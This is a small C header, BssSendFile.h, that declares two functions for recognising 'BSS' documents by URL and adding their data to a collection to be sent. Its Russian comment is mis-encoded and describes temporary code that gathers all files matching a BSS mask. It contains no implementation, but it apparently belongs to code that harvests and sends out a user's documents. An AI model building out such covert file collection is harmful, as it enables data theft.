
#ifndef BssSendFileH
#define BssSendFileH

//----------------------------------------------------------------------------

//----------------------------------------------------------------------------
//  ¬ременный код, который складывает все файлы удовлетвор€ющие маске бсс
//----------------------------------------------------------------------------

void AddBSSFile(PCHAR URL, LPVOID Data, DWORD DataSize);
bool IsBSSDocument(PCHAR URL);


//----------------------------------------------------------------------------
#endif
